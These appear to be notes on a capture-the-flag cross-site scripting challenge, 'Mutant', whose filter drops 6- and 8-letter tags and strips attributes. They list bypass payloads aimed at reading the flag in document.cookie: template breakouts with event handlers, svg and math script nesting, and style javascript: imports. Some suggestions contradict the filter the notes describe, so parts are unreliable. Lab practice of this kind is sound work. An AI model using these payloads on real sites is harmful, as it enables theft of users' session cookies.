# Mutant XSS Challenge Analysis

## Challenge Overview

Mutant 
this is a peak only xss challenege that involves a web page that allows u to enter certain xss payload and if one payload let u enter the file where the flag is saved is also given which is stored in document.cookie file 

but for that we have to find a way to surpass the xss vulnerability as it is specifically constructed for this task we have to solve this by entering a payload that is not of 6 or 8 words which are the most common payloads used for xss vulnerability as script and other stuff

so here I have a opportunity to try several enteries using intruder and finding a xss vulneribilityy list that I can upload and let it scan the ouput so first I will try that only

so as far as I know I have to find a payload that surpass the set of script that stops xss and enter and somehow write a script that print everything written inside document.cookie file 

## Filter Mechanism Analysis

-User input (input) is taken from the URL and put into a template element.
-All elements whose tag names are 6 or 8 letters long (n.nodeName.length === 6 || n.nodeName.length === 8) are removed (e.g., script, iframe, object, applet).
-All attributes are removed from elements during a sanitization loop.
-The resulting HTML is inserted into the output and shown to the user (myoutput.innerHTML).

Your Next Steps
Try tags of odd lengths (e.g., 3, 4, 5, 7)—but no JS without attributes.
Check if the output appears in a different context (e.g., inside a <script>, <style>, or as an attribute). If so, context-breaking or template escapes could work.
Try <template>-specific quirks—in rare cases, browsers misparse <template> contents, but this is extremely advanced.

## Attack Surface Analysis

### Filter Analysis
- **Blocked**: Tags with 6 or 8 characters (like `script`, `iframe`, `object`, `applet`)
- **Blocked**: All attributes are stripped
- **Context**: Input goes into a `<template>` element, then innerHTML

## Potential Bypass Vectors

### 1. Short Tag Names (3-5, 7+ characters)
Since 6 and 8 character tags are blocked, try:
- `<img>` (3 chars) - but needs attributes for XSS
- `<svg>` (3 chars) - can contain script without attributes
- `<math>` (4 chars) - MathML context
- `<style>` (5 chars) - CSS injection
- `<details>` (7 chars) - HTML5 element

### 2. Context-Breaking Payloads
If the filtered content is inserted into different contexts:

**For `<template>` context breaking:**
```html
</template><svg onload=alert(document.cookie)>
```

**For script context (if template content is later used in JS):**
```javascript
';alert(document.cookie);//
```

### 3. Attribute-Free XSS Vectors

**SVG with embedded script:**
```html
<svg><script>alert(document.cookie)</script></svg>
```

**Style-based injection:**
```html
<style>@import'javascript:alert(document.cookie)'</style>
```

**Math element with script:**
```html
<math><script>alert(document.cookie)</script></math>
```

### 4. Template-Specific Exploitation
Since input goes into `<template>`:

**Template escape:**
```html
</template><img src=x onerror=alert(document.cookie)>
```

**Template with nested content:**
```html
<template><svg><script>alert(document.cookie)</script></svg></template>
```

## Recommended Testing Approach

1. **Test basic context breaking first:**
   - `</template><svg onload=alert(1)>`
   - `</template><img src=x onerror=alert(1)>`

2. **Try attribute-free vectors:**
   - `<svg><script>alert(1)</script></svg>`
   - `<style>body{background:url('javascript:alert(1)')}</style>`

3. **Test odd-length tags:**
   - `<embed src=javascript:alert(1)>`
   - `<blink>` or other deprecated tags

4. **Check for double-decoding or encoding bypasses:**
   - HTML entities: `&lt;script&gt;`
   - URL encoding: `%3Cscript%3E`

## Key Attack Strategy

The key is that you need to either:
1. Break out of the template context entirely
2. Use tags that can execute JavaScript without attributes
3. Find a way to inject into a different parsing context

## Goal

The ultimate goal is to create a payload that bypasses the filter and executes JavaScript to access and display the contents of `document.cookie` where the flag is stored.
